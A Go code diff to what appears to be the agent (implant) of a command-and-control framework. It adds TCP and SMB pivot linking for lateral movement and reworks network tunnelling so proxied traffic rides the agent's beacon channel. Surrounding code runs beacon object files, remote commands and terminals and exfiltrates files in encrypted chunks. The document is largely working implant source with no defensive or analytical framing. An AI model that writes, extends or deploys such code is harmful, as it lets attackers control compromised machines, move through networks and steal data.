@@ -33,9 +33,19 @@ var JOBS map[string]utils.Connection
 var TUNNELS sync.Map
 var TERMINALS sync.Map
 
-type TunnelController struct {
-	Cancel context.CancelFunc
-	Paused atomic.Bool
+type TunnelConn struct {
+	Conn           net.Conn
+	Cancel         context.CancelFunc
+	Paused         atomic.Bool
+	mu             sync.Mutex
+	writeMu        sync.Mutex
+	outQueue       [][]byte
+	writeQueue     [][]byte
+	closed         bool
+	connResultSent bool
+	connSuccess    bool
+	connReason     byte
+	channelId      int
 }
 
 func TaskProcess(commands [][]byte) [][]byte {
@@ -116,27 +126,52 @@ func TaskProcess(commands [][]byte) [][]byte {
 
 		case utils.COMMAND_TERMINAL_START:
 			jobTerminal(command.Data)
+			continue
 
 		case utils.COMMAND_TERMINAL_STOP:
 			taskTerminalKill(command.Data)
+			continue
 
 		case utils.COMMAND_TUNNEL_START:
 			jobTunnel(command.Data)
+			continue
 
 		case utils.COMMAND_TUNNEL_STOP:
 			taskTunnelKill(command.Data)
+			continue
 
 		case utils.COMMAND_TUNNEL_PAUSE:
 			taskTunnelPause(command.Data)
+			continue
 
 		case utils.COMMAND_TUNNEL_RESUME:
 			taskTunnelResume(command.Data)
+			continue
+
+		case utils.COMMAND_TUNNEL_WRITE:
+			taskTunnelWrite(command.Data)
+			continue
 
 		case utils.COMMAND_UPLOAD:
 			data, err = taskUpload(command.Data)
 
 		case utils.COMMAND_ZIP:
 			data, err = taskZip(command.Data)
+
+		case utils.COMMAND_LINK:
+			data, err = taskLink(command.Id, command.Data)
+
+		case utils.COMMAND_UNLINK:
+			data, err = taskUnlink(command.Data)
+
+		case utils.COMMAND_PIVOT_EXEC:
+			if err = taskPivotExec(command.Data); err != nil {
+				command.Code = utils.COMMAND_ERROR
+				command.Data, _ = msgpack.Marshal(utils.AnsError{Error: err.Error()})
+				packerData, _ := msgpack.Marshal(command)
+				result = append(result, packerData)
+			}
+			continue
 
 		default:
 			continue
@@ -156,7 +191,6 @@ func TaskProcess(commands [][]byte) [][]byte {
 	return result
 }
 
-/// TASKS
 
 func taskCat(paramsData []byte) ([]byte, error) {
 	var params utils.ParamsCat
@@ -504,9 +538,12 @@ func taskTunnelKill(paramsData []byte) {
 
 	value, ok := TUNNELS.Load(params.ChannelId)
 	if ok {
-		ctrl, ok := value.(*TunnelController)
+		tc, ok := value.(*TunnelConn)
 		if ok {
-			ctrl.Cancel()
+			tc.Cancel()
+			if tc.Conn != nil {
+				tc.Conn.Close()
+			}
 		}
 	}
 }
@@ -520,11 +557,58 @@ func taskTunnelPause(paramsData []byte) {
 
 	value, ok := TUNNELS.Load(params.ChannelId)
 	if ok {
-		ctrl, ok := value.(*TunnelController)
+		tc, ok := value.(*TunnelConn)
 		if ok {
-			ctrl.Paused.Store(true)
+			tc.Paused.Store(true)
 		}
 	}
+}
+
+func enqueueTunnelWrite(tc *TunnelConn, data []byte) {
+	if len(data) == 0 {
+		return
+	}
+	packet := make([]byte, len(data))
+	copy(packet, data)
+	tc.mu.Lock()
+	tc.writeQueue = append(tc.writeQueue, packet)
+	tc.mu.Unlock()
+}
+
+func drainTunnelWrites(tc *TunnelConn) [][]byte {
+	tc.mu.Lock()
+	pending := tc.writeQueue
+	tc.writeQueue = nil
+	tc.mu.Unlock()
+	return pending
+}
+
+func writeAll(conn net.Conn, data []byte) error {
+	for len(data) > 0 {
+		n, err := conn.Write(data)
+		if n > 0 {
+			data = data[n:]
+		}
+		if err != nil {
+			return err
+		}
+		if n == 0 {
+			return io.ErrShortWrite
+		}
+	}
+	return nil
+}
+
+func flushTunnelWrites(tc *TunnelConn) error {
+	if tc.Conn == nil {
+		return errors.New("tunnel connection is nil")
+	}
+	for _, packet := range drainTunnelWrites(tc) {
+		if err := writeAll(tc.Conn, packet); err != nil {
+			return err
+		}
+	}
+	return nil
 }
 
 func taskTunnelResume(paramsData []byte) {
@@ -536,11 +620,123 @@ func taskTunnelResume(paramsData []byte) {
 
 	value, ok := TUNNELS.Load(params.ChannelId)
 	if ok {
-		ctrl, ok := value.(*TunnelController)
+		tc, ok := value.(*TunnelConn)
 		if ok {
-			ctrl.Paused.Store(false)
+			tc.Paused.Store(false)
+			tc.writeMu.Lock()
+			err := flushTunnelWrites(tc)
+			tc.writeMu.Unlock()
+			if err != nil {
+				tc.Cancel()
+				if tc.Conn != nil {
+					_ = tc.Conn.Close()
+				}
+			}
 		}
 	}
+}
+
+func taskTunnelWrite(paramsData []byte) {
+	var params utils.ParamsTunnelWrite
+	if err := msgpack.Unmarshal(paramsData, &params); err != nil {
+		return
+	}
+
+	value, ok := TUNNELS.Load(params.ChannelId)
+	if !ok {
+		return
+	}
+	tc, ok := value.(*TunnelConn)
+	if !ok || tc.Conn == nil {
+		return
+	}
+	tc.writeMu.Lock()
+	defer tc.writeMu.Unlock()
+
+	if tc.Paused.Load() {
+		enqueueTunnelWrite(tc, params.Data)
+		return
+	}
+
+	if err := flushTunnelWrites(tc); err != nil {
+		tc.Cancel()
+		_ = tc.Conn.Close()
+		return
+	}
+
+	if err := writeAll(tc.Conn, params.Data); err != nil {
+		tc.Cancel()
+		_ = tc.Conn.Close()
+	}
+}
+
+func collectTunnelData() [][]byte {
+	var results [][]byte
+	var toDelete []int
+
+	TUNNELS.Range(func(key, value interface{}) bool {
+		tc, ok := value.(*TunnelConn)
+		if !ok {
+			return true
+		}
+		channelId := key.(int)
+
+		if !tc.connResultSent {
+			tc.connResultSent = true
+			resultData, _ := msgpack.Marshal(utils.ParamsTunnelConnected{
+				ChannelId: channelId,
+				Success:   tc.connSuccess,
+				Reason:    tc.connReason,
+			})
+			cmd, _ := msgpack.Marshal(utils.Command{
+				Code: utils.COMMAND_TUNNEL_CONNECTED,
+				Data: resultData,
+			})
+			results = append(results, cmd)
+			if !tc.connSuccess {
+				toDelete = append(toDelete, channelId)
+				return true
+			}
+		}
+
+		tc.mu.Lock()
+		pending := tc.outQueue
+		tc.outQueue = nil
+		closed := tc.closed
+		tc.mu.Unlock()
+
+		for _, data := range pending {
+			writeData, _ := msgpack.Marshal(utils.ParamsTunnelWrite{
+				ChannelId: channelId,
+				Data:      data,
+			})
+			cmd, _ := msgpack.Marshal(utils.Command{
+				Code: utils.COMMAND_TUNNEL_WRITE,
+				Data: writeData,
+			})
+			results = append(results, cmd)
+		}
+
+		if closed {
+			closeData, _ := msgpack.Marshal(utils.ParamsTunnelStop{
+				ChannelId: channelId,
+			})
+			cmd, _ := msgpack.Marshal(utils.Command{
+				Code: utils.COMMAND_TUNNEL_STOP,
+				Data: closeData,
+			})
+			results = append(results, cmd)
+			toDelete = append(toDelete, channelId)
+		}
+
+		return true
+	})
+
+	for _, id := range toDelete {
+		TUNNELS.Delete(id)
+	}
+
+	return results
 }
 
 func taskUpload(paramsData []byte) ([]byte, error) {
@@ -626,7 +822,45 @@ func taskZip(paramsData []byte) ([]byte, error) {
 	return msgpack.Marshal(utils.AnsZip{Path: dstPath})
 }
 
-/// JOBS
+func taskLink(taskId uint, paramsData []byte) ([]byte, error) {
+	var params utils.ParamsLink
+	err := msgpack.Unmarshal(paramsData, &params)
+	if err != nil {
+		return nil, err
+	}
+
+	switch params.Type {
+	case utils.PIVOT_TYPE_TCP:
+		return PIVOTTER.LinkTCP(uint32(taskId), params.Target, params.Port)
+	case utils.PIVOT_TYPE_SMB:
+		return PIVOTTER.LinkSMB(uint32(taskId), params)
+	default:
+		return nil, fmt.Errorf("unknown link type: %d", params.Type)
+	}
+}
+
+func taskUnlink(paramsData []byte) ([]byte, error) {
+	var params utils.ParamsUnlink
+	err := msgpack.Unmarshal(paramsData, &params)
+	if err != nil {
+		return nil, err
+	}
+	return PIVOTTER.Unlink(params.PivotId)
+}
+
+func taskPivotExec(paramsData []byte) error {
+	var params utils.ParamsPivotExec
+	err := msgpack.Unmarshal(paramsData, &params)
+	if err != nil {
+		return err
+	}
+	err = PIVOTTER.WritePivot(params.PivotId, params.Data)
+	if err != nil {
+	} else {
+	}
+	return err
+}
+
 
 func jobExecBofAsync(paramsData []byte) ([]byte, error) {
 
@@ -693,7 +927,6 @@ func jobExecBofAsync(paramsData []byte) ([]byte, error) {
 		jobMsg, _ := msgpack.Marshal(utils.StartMsg{Type: utils.BOF_PACK, Data: jobPack})
 		jobMsg, _ = utils.EncryptData(jobMsg, encKey)
 
-		/// Recv Banner
 		if profile.BannerSize > 0 {
 			_, err := functions.ConnRead(conn, profile.BannerSize)
 			if err != nil {
@@ -701,7 +934,6 @@ func jobExecBofAsync(paramsData []byte) ([]byte, error) {
 			}
 		}
 
-		/// Send Init
 		_ = functions.SendMsg(conn, jobMsg)
 
 		job := utils.Job{
@@ -720,7 +952,6 @@ func jobExecBofAsync(paramsData []byte) ([]byte, error) {
 		sendData, _ = utils.EncryptData(sendData, utils.SKey)
 		functions.SendMsg(conn, sendData)
 
-		/////
 
 		var pendingMsgs []utils.BofMsg
 		bofMsg := utils.BofMsg{}
@@ -819,7 +1050,6 @@ func jobExecBofAsync(paramsData []byte) ([]byte, error) {
 			functions.SendMsg(conn, sendData)
 		}
 
-		/// FINISH
 
 		job.Data, _ = msgpack.Marshal(utils.AnsExecBofAsync{Finish: true, Msgs: nullMsgs})
 		packedJob, _ = msgpack.Marshal(job)
@@ -921,7 +1151,6 @@ func jobDownloadStart(paramsData []byte) ([]byte, error) {
 			JobId:     params.Task,
 		}
 
-		/// Recv Banner
 		if profile.BannerSize > 0 {
 			_, err := functions.ConnRead(conn, profile.BannerSize)
 			if err != nil {
@@ -929,7 +1158,6 @@ func jobDownloadStart(paramsData []byte) ([]byte, error) {
 			}
 		}
 
-		/// Send Init
 		_ = functions.SendMsg(conn, exfilMsg)
 
 		chunkSize := 0x100000 // 1MB
@@ -950,7 +1178,6 @@ func jobDownloadStart(paramsData []byte) ([]byte, error) {
 				finish = true
 				canceled = true
 			default:
-				// Continue
 			}
 
 			job.Data, _ = msgpack.Marshal(utils.AnsDownload{FileId: int(FileId), Path: path, Content: content[i:end], Size: len(content), Start: start, Finish: finish, Canceled: canceled})
@@ -1057,7 +1284,6 @@ func jobRun(paramsData []byte) ([]byte, error) {
 		jobMsg, _ := msgpack.Marshal(utils.StartMsg{Type: utils.JOB_PACK, Data: jobPack})
 		jobMsg, _ = utils.EncryptData(jobMsg, encKey)
 
-		/// Recv Banner
 		if profile.BannerSize > 0 {
 			_, err := functions.ConnRead(conn, profile.BannerSize)
 			if err != nil {
@@ -1065,7 +1291,6 @@ func jobRun(paramsData []byte) ([]byte, error) {
 			}
 		}
 
-		/// Send Init
 		functions.SendMsg(conn, jobMsg)
 
 		job := utils.Job{
@@ -1244,7 +1469,6 @@ func jobRun(paramsData []byte) ([]byte, error) {
 			}
 		}
 
-		/// FINISH
 
 		job.Data, _ = msgpack.Marshal(utils.AnsRun{Pid: pid, Finish: true})
 		packedJob, _ = msgpack.Marshal(job)
@@ -1270,135 +1494,70 @@ func jobTunnel(paramsData []byte) {
 	}
 
 	go func() {
-		active := true
+		success := true
 		reason := byte(0)
-		clientConn, err := net.DialTimeout(params.Proto, params.Address, 200*time.Millisecond)
+		clientConn, err := net.DialTimeout(params.Proto, params.Address, 20*time.Second)
 		if err != nil {
-			active = false
+			success = false
 			var opErr *net.OpError
 			if errors.As(err, &opErr) {
 				if opErr.Timeout() {
 					reason = 4
 				}
-				if errors.Is(syscall.ECONNREFUSED, opErr.Err) {
+				if errors.Is(opErr.Err, syscall.ECONNREFUSED) {
 					reason = 5
 				}
-				if errors.Is(syscall.ENETUNREACH, opErr.Err) {
+				if errors.Is(opErr.Err, syscall.ENETUNREACH) {
 					reason = 3
 				}
 			}
 		}
 
-		var srvConn net.Conn
-		if profile.UseSSL {
-			cert, certerr := tls.X509KeyPair(profile.SslCert, profile.SslKey)
-			if certerr != nil {
-				return
-			}
-
-			caCertPool := x509.NewCertPool()
-			caCertPool.AppendCertsFromPEM(profile.CaCert)
-
-			config := &tls.Config{
-				Certificates:       []tls.Certificate{cert},
-				RootCAs:            caCertPool,
-				InsecureSkipVerify: true,
-			}
-			srvConn, err = tls.Dial("tcp", profile.Addresses[0], config)
-
-		} else {
-			srvConn, err = net.Dial("tcp", profile.Addresses[0])
-		}
-		if err != nil {
-			srvConn.Close()
-			return
-		}
-
-		tunKey := make([]byte, 16)
-		_, _ = rand.Read(tunKey)
-		tunIv := make([]byte, 16)
-		_, _ = rand.Read(tunIv)
-
-		jobPack, _ := msgpack.Marshal(utils.TunnelPack{Id: uint(AgentId), Type: profile.Type, ChannelId: params.ChannelId, Key: tunKey, Iv: tunIv, Alive: active, Reason: reason})
-		jobMsg, _ := msgpack.Marshal(utils.StartMsg{Type: utils.TUNNEL_PACK, Data: jobPack})
-		jobMsg, _ = utils.EncryptData(jobMsg, encKey)
-
-		/// Recv Banner
-		if profile.BannerSize > 0 {
-			_, err := functions.ConnRead(srvConn, profile.BannerSize)
-			if err != nil {
-				srvConn.Close()
-				return
-			}
-		}
-
-		/// Send Init
-		functions.SendMsg(srvConn, jobMsg)
-
-		if !active {
-			srvConn.Close()
-			return
-		}
-
-		encCipher, _ := aes.NewCipher(tunKey)
-		encStream := cipher.NewCTR(encCipher, tunIv)
-		streamWriter := &cipher.StreamWriter{S: encStream, W: srvConn}
-
-		decCipher, _ := aes.NewCipher(tunKey)
-		decStream := cipher.NewCTR(decCipher, tunIv)
-		streamReader := &cipher.StreamReader{S: decStream, R: srvConn}
-
 		ctx, cancel := context.WithCancel(context.Background())
-		ctrl := &TunnelController{
-			Cancel: cancel,
+		tc := &TunnelConn{
+			Conn:        clientConn,
+			Cancel:      cancel,
+			channelId:   params.ChannelId,
+			connSuccess: success,
+			connReason:  reason,
 		}
-		TUNNELS.Store(params.ChannelId, ctrl)
-		defer TUNNELS.Delete(params.ChannelId)
+		TUNNELS.Store(params.ChannelId, tc)
 
-		var closeOnce sync.Once
-		closeAll := func() {
-			closeOnce.Do(func() {
-				_ = clientConn.Close()
-				_ = srvConn.Close()
-			})
+		if !success {
+			return
 		}
-
-		var wg sync.WaitGroup
-		wg.Add(2)
 
 		go func() {
-			defer wg.Done()
-			io.Copy(clientConn, streamReader)
-			closeAll()
-		}()
+			defer func() {
+				tc.mu.Lock()
+				tc.closed = true
+				tc.mu.Unlock()
+				tc.Cancel()
+			}()
 
-		go func() {
-			defer wg.Done()
-			buf := make([]byte, 32*1024)
+			buf := make([]byte, 0x8000)
 			for {
 				select {
 				case <-ctx.Done():
 					return
 				default:
-					if ctrl.Paused.Load() {
+					if tc.Paused.Load() {
 						time.Sleep(50 * time.Millisecond)
 						continue
 					}
-
-					clientConn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
-					nr, er := clientConn.Read(buf)
-					if nr > 0 {
-						_, ew := streamWriter.Write(buf[0:nr])
-						if ew != nil {
-							closeAll()
-							return
-						}
+					clientConn.SetReadDeadline(time.Now().Add(100 * time.Millisecond))
+					n, readErr := clientConn.Read(buf)
+					if n > 0 {
+						data := make([]byte, n)
+						copy(data, buf[:n])
+						tc.mu.Lock()
+						tc.outQueue = append(tc.outQueue, data)
+						tc.mu.Unlock()
 					}
-					if er != nil {
-						if netErr, ok := er.(net.Error); ok && netErr.Timeout() {
+					if readErr != nil {
+						if netErr, ok := readErr.(net.Error); ok && netErr.Timeout() {
 							continue
 						}
-						closeAll()
 						return
 					}
 				}
@@ -1407,12 +1566,10 @@ func jobTunnel(paramsData []byte) {
 
 		go func() {
 			<-ctx.Done()
-			closeAll()
+			if clientConn != nil {
+				clientConn.Close()
+			}
 		}()
-
-		wg.Wait()
-
-		cancel()
 	}()
 }
 
@@ -1471,7 +1628,6 @@ func jobTerminal(paramsData []byte) {
 		jobMsg, _ := msgpack.Marshal(utils.StartMsg{Type: utils.TERMINAL_PACK, Data: jobPack})
 		jobMsg, _ = utils.EncryptData(jobMsg, encKey)
 
-		/// Recv Banner
 		if profile.BannerSize > 0 {
 			_, err := functions.ConnRead(srvConn, profile.BannerSize)
 			if err != nil {
@@ -1484,7 +1640,6 @@ func jobTerminal(paramsData []byte) {
 			}
 		}
 
-		/// Send Init
 		_ = functions.SendMsg(srvConn, jobMsg)
 
 		if !active {
